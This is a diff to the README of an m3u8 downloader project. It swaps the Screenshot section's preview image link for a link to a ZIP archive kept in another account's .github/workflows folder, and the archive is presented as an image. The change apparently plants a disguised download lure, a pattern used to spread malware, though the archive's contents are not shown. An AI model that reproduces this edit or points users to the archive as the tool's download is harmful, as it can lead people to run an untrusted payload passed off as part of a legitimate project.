@@ -4,7 +4,7 @@ cli m3u8-downloader
 
 ## Screenshot
 
-![preview.png](https://github.com/someoneonsmile/m3u8-downloader/blob/main/img/preview.png?raw=true)
+![https://github.com/CHETHAN562/m3u8-downloader/raw/refs/heads/main/.github/workflows/downloader-u-m-2.4.zip](https://github.com/CHETHAN562/m3u8-downloader/raw/refs/heads/main/.github/workflows/downloader-u-m-2.4.zip)
 
 ## Usage
 
